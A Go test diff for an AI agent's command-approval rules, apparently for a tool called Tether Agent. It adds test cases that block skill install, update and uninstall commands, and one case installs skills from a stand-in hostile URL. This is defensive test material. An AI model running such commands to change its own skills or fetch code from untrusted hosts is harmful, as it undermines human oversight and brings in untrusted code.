@@ -16,6 +16,35 @@ func TestHardline(t *testing.T) {
 	if _, ok := MatchHardline("rm -rf /tmp/x"); ok {
 		t.Fatal("not hardline")
 	}
+	for _, c := range []string{
+		"tether skills install openai/skills --skill pdf --yes --force",
+		"tether skills update",
+		"tether skills uninstall pdf --yes",
+		"cd /tmp && TETHER skills Install x",
+		"/usr/local/bin/tether skills update pdf",
+		"tether skills --yes --force install https://evil.example/r",
+		"tether skills --data-dir ~/.tether install x --yes",
+		"tether skills --data-dir=/srv/t uninstall pdf",
+		"tether skills -yes update",
+		"tether skills -- install x",
+	} {
+		p, ok := MatchHardline(c)
+		if !ok || p.ID != "tether_skills_change_hardline" {
+			t.Fatalf("%s: got %q, %v", c, p.ID, ok)
+		}
+	}
+	for _, c := range []string{
+		"tether skills list --available",
+		"tether skills check",
+		"tether skills reset tether-memory",
+		"echo tether skillset install",
+		"tether skills list --available install",
+		"tether skills --data-dir /x check pdf",
+	} {
+		if p, ok := MatchHardline(c); ok {
+			t.Fatalf("%s: matched %q", c, p.ID)
+		}
+	}
 }
 
 func TestDangerous(t *testing.T) {
@@ -70,9 +99,10 @@ func TestPatternIDsUnique(t *testing.T) {
 }
 
 // TestPatternCountsMatchHermes guards the port. Hermes tools/approval.py has
-// 12 HARDLINE_PATTERNS and 56 DANGEROUS_PATTERNS.
+// 12 HARDLINE_PATTERNS and 56 DANGEROUS_PATTERNS. Tether Agent adds one
+// hardline rule for the skill install commands.
 func TestPatternCountsMatchHermes(t *testing.T) {
-	if len(HardlinePatterns) != 12 || len(DangerousPatterns) != 56 {
+	if len(HardlinePatterns) != 12+1 || len(DangerousPatterns) != 56 {
 		t.Fatalf("hardline %d, dangerous %d", len(HardlinePatterns), len(DangerousPatterns))
 	}
 }
